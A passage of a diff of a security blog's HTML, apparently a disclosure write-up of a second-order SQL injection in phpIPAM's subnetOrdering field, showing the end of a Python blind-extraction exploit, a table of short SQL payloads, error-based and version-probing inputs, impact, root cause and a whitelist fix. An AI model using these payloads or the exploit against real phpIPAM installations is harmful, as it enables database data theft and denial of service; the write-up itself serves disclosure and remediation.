+</span></span><span style=display:flex><span>                    found <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>True</span>
+</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> found:
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>[+] Extracted: </span><span style=color:#f1fa8c>{</span>extracted<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    app <span style=color:#ff79c6>=</span> IPAM_Position_SQLi(TARGET, USER, PASS)
+</span></span><span style=display:flex><span>    app<span style=color:#ff79c6>.</span>exploit()
+</span></span></code></pre></div><h3 id=the-varchar16-constraint>The VARCHAR(16) Constraint</h3><p>The <code>subnetOrdering</code> column is defined as <code>VARCHAR(16)</code>, which severely limits payload length. Here's what fits and what doesn't:</p><table><thead><tr><th>Payload</th><th>Length</th><th>Works?</th></tr></thead><tbody><tr><td><code>SLEEP(3)</code></td><td>8</td><td>Yes</td></tr><tr><td><code>id>5</code></td><td>4</td><td>Yes</td></tr><tr><td><code>IF(1=1,1,2)</code></td><td>11</td><td>Yes</td></tr><tr><td><code>USER()</code></td><td>6</td><td>Yes</td></tr><tr><td><code>@@version>'10'</code></td><td>14</td><td>Yes</td></tr><tr><td><code>@@version>'10.5'</code></td><td>16</td><td>Yes (limit!)</td></tr><tr><td><code>(SELECT USER())</code></td><td>14</td><td>Yes</td></tr><tr><td><code>IF(1=1,SLEEP(3),1)</code></td><td>18</td><td>No (too long)</td></tr></tbody></table><p>This constraint makes exploitation more challenging but far from impossible. The boolean-based positional technique works well within these limits.</p><h3 id=other-confirmed-techniques>Other Confirmed Techniques</h3><p><strong>Error-Based</strong> payloads like <code>EXP(999)</code> or <code>POW(9,9,9)</code> trigger visible SQL errors on the page, confirming injection:</p><pre tabindex=0><code>SQLSTATE[22003]: Numeric value out of range: 1690
 DOUBLE value is out of range in &#39;exp(999)&#39;
-</code></pre><p><strong>Version Detection</strong>  binary search using comparisons:</p>
-<pre tabindex="0"><code>@@version&gt;&#39;10&#39;      → TRUE (version &gt;= 10)
+</code></pre><p><strong>Version Detection</strong> binary search using comparisons:</p><pre tabindex=0><code>@@version&gt;&#39;10&#39;      → TRUE (version &gt;= 10)
 @@version&gt;&#39;11&#39;      → FALSE (version &lt; 11)
 @@version&gt;&#39;10.5&#39;    → TRUE (version &gt;= 10.5)
-</code></pre><h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Authentication Required:</strong>  privileges needed to edit sections.</li>
-<li><strong>Persistent:</strong> The payload stays in the database and fires every time any user views that section's subnets.</li>
-<li><strong>Blind Data Extraction:</strong> Database user, version, and potentially table contents can be extracted via boolean-based or time-based techniques.</li>
-<li><strong>Denial of Service:</strong> <code>SLEEP()</code> payloads cause significant delays for all users viewing the affected section.</li>
-</ul>
-<h2 id="root-cause">Root Cause</h2>
-<p>The root cause is straightforward: the application treats a stored value as trusted data. The <code>subnetOrdering</code> value passes through <code>strip_tags()</code> (which only removes HTML) and is later interpolated directly into a SQL query without validation.</p>
-<pre tabindex="0"><code>User Input → strip_tags() → Database (stored safely via PDO)
+</code></pre><h2 id=impact>Impact</h2><ul><li><strong>Authentication Required:</strong> privileges needed to edit sections.</li><li><strong>Persistent:</strong> The payload stays in the database and fires every time any user views that section's subnets.</li><li><strong>Blind Data Extraction:</strong> Database user, version, and potentially table contents can be extracted via boolean-based or time-based techniques.</li><li><strong>Denial of Service:</strong> <code>SLEEP()</code> payloads cause significant delays for all users viewing the affected section.</li></ul><h2 id=root-cause>Root Cause</h2><p>The root cause is straightforward: the application treats a stored value as trusted data. The <code>subnetOrdering</code> value passes through <code>strip_tags()</code> (which only removes HTML) and is later interpolated directly into a SQL query without validation.</p><pre tabindex=0><code>User Input → strip_tags() → Database (stored safely via PDO)
                                 ↓
 Database → fetch_object() → string concatenation into SQL → BOOM
-</code></pre><h2 id="remediation">Remediation</h2>
-<p>The fix is a whitelist validation before using the value in the query:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$allowed_ordering</span> <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;subnet&#39;</span>, <span style="color:#f1fa8c">&#39;description&#39;</span>, <span style="color:#f1fa8c">&#39;id&#39;</span>, <span style="color:#f1fa8c">&#39;vlanId&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$allowed_directions</span> <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;asc&#39;</span>, <span style="color:#f1fa8c">&#39;desc&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$order</span> <span style="color:#ff79c6">=</span> pf_explode(<span style="color:#f1fa8c">&#39;,&#39;</span>, <span style="color:#8be9fd;font-style:italic">$section</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">subnetOrdering</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>in_array(<span style="color:#8be9fd;font-style:italic">$order</span>[<span style="color:#bd93f9">0</span>], <span style="color:#8be9fd;font-style:italic">$allowed_ordering</span>, <span style="color:#ff79c6">true</span>)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$order</span>[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;subnet&#39;</span>; <span style="color:#6272a4">// safe default
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$order</span>[<span style="color:#bd93f9">1</span>]) <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>in_array(strtolower(trim(<span style="color:#8be9fd;font-style:italic">$order</span>[<span style="color:#bd93f9">1</span>])), <span style="color:#8be9fd;font-style:italic">$allowed_directions</span>, <span style="color:#ff79c6">true</span>)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$order</span>[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;asc&#39;</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><table>
-  <thead>
-      <tr>
-          <th></th>
-          <th></th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>CVE</strong></td>
-          <td><a href="https://www.tenable.com/cve/CVE-2026-4189">CVE-2026-4189</a></td>
-      </tr>
-      <tr>
-          <td><strong>Affected Version</strong></td>
-          <td>phpIPAM up to 1.7.4</td>
-      </tr>
-      <tr>
-          <td><strong>Type</strong></td>
-          <td>Second Order SQL Injection</td>
-      </tr>
-      <tr>
-          <td><strong>Component</strong></td>
-          <td><code>app/admin/sections/edit-result.php</code> / <code>subnetOrdering</code> parameter</td>
-      </tr>
-      <tr>
-          <td><strong>CVSS v3</strong></td>
-          <td>4.7 (Medium)  <code>AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L</code></td>
-      </tr>
-      <tr>
-          <td><strong>CVSS v4</strong></td>
-          <td>5.1 (Medium)</td>
-      </tr>
-  </tbody>
-</table>
-<p>Keep hacking.</p>
-
-  </div>
-
-  <footer class="post-footer fade-in">
-    <div class="post-nav">
-      
-      <a href="https://incogbyte.github.io/posts/runner-mobilehackinglabs/" class="post-nav-link prev">
-        <span>← Previous</span>
-        <span class="post-nav-title">Runner Mobile Hacking Labs</span>
-      </a>
-      
-      
-      <a href="https://incogbyte.github.io/posts/2026-04-15-exploiting-iphone3gs-bootrom-dump-limera1n/" class="post-nav-link next">
-        <span>Next →</span>
-        <span class="post-nav-title">Jailbreaking the iPhone 3GS from Scratch, Part 1: initial access</span>
-      </a>
-      
-    </div>
-  </footer>
-</article>
-
-  </main>
-
-  <footer class="site-footer">
-  <div class="footer-content">
-    <div class="footer-links">
-      <a href="https://github.com/incogbyte" target="_blank" rel="noopener" aria-label="GitHub">GitHub</a>
-      <a href="https://x.com/incogbyte" target="_blank" rel="noopener" aria-label="X/Twitter">X</a>
-      <a href="https://linkedin.com/in/rodolfo-tavares-543863a7" target="_blank" rel="noopener" aria-label="LinkedIn">LinkedIn</a>
-      <a href="https://infosec.exchange/@incogbyte" target="_blank" rel="noopener" aria-label="Mastodon">Mastodon</a>
-    </div>
-    <p class="footer-copy">&copy; 2026 Rodolfo Tavares — Built with Hugo</p>
-  </div>
-</footer>
-
-
-  <script src="/js/matrix.js"></script>
-  <script src="/js/main.js"></script>
-</body>
-</html>
+</code></pre><h2 id=remediation>Remediation</h2><p>The fix is a whitelist validation before using the value in the query:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$allowed_ordering</span> <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#39;subnet&#39;</span>, <span style=color:#f1fa8c>&#39;description&#39;</span>, <span style=color:#f1fa8c>&#39;id&#39;</span>, <span style=color:#f1fa8c>&#39;vlanId&#39;</span>];
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$allowed_directions</span> <span style=color:#ff79c6>=</span> [<span style=color:#f1fa8c>&#39;asc&#39;</span>, <span style=color:#f1fa8c>&#39;desc&#39;</span>, <span style=color:#f1fa8c>&#39;&#39;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$order</span> <span style=color:#ff79c6>=</span> pf_explode(<span style=color:#f1fa8c>&#39;,&#39;</span>, <span style=color:#8be9fd;font-style:italic>$section</span><span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>subnetOrdering</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!</span>in_array(<span style=color:#8be9fd;font-style:italic>$order</span>[<span style=color:#bd93f9>0</span>], <span style=color:#8be9fd;font-style:italic>$allowed_ordering</span>, <span style=color:#ff79c6>true</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$order</span>[<span style=color:#bd93f9>0</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;subnet&#39;</span>; <span style=color:#6272a4>// safe default
+</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>}
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> (isset(<span style=color:#8be9fd;font-style:italic>$order</span>[<span style=color:#bd93f9>1</span>]) <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>in_array(strtolower(trim(<span style=color:#8be9fd;font-style:italic>$order</span>[<span style=color:#bd93f9>1</span>])), <span style=color:#8be9fd;font-style:italic>$allowed_directions</span>, <span style=color:#ff79c6>true</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>$order</span>[<span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;asc&#39;</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>CVE</strong></td><td><a href=https://www.tenable.com/cve/CVE-2026-4189>CVE-2026-4189</a></td></tr><tr><td><strong>Affected Version</strong></td><td>phpIPAM up to 1.7.4</td></tr><tr><td><strong>Type</strong></td><td>Second Order SQL Injection</td></tr><tr><td><strong>Component</strong></td><td><code>app/admin/sections/edit-result.php</code> / <code>subnetOrdering</code> parameter</td></tr><tr><td><strong>CVSS v3</strong></td><td>4.7 (Medium) <code>AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L</code></td></tr><tr><td><strong>CVSS v4</strong></td><td>5.1 (Medium)</td></tr></tbody></table><p>Keep hacking.</p></div><footer class="post-footer fade-in"><div class=post-nav><a href=https://incogbyte.github.io/posts/runner-mobilehackinglabs/ class="post-nav-link prev"><span>← Previous</span>
+<span class=post-nav-title>Runner Mobile Hacking Labs</span>
+</a><a href=https://incogbyte.github.io/posts/2026-04-15-exploiting-iphone3gs-bootrom-dump-limera1n/ class="post-nav-link next"><span>Next →</span>
+<span class=post-nav-title>Jailbreaking the iPhone 3GS from Scratch, Part 1: initial access</span></a></div></footer></article></main><footer class=site-footer><div class=footer-content><p><span class=footer-prompt>~/incogbyte</span> <span>Security research, notes and disclosures.</span></p><nav class=footer-links aria-label="External profiles"><a href=https://github.com/incogbyte target=_blank rel="noopener noreferrer">GitHub</a>
+<a href=https://linkedin.com/in/rodolfo-tavares-543863a7 target=_blank rel="noopener noreferrer">LinkedIn</a>
+<a href=mailto:incogbyte@protonmail.com>Email</a>
+<a href=/index.xml>RSS</a></nav></div></footer><script src=/js/main.js></script></body></html>
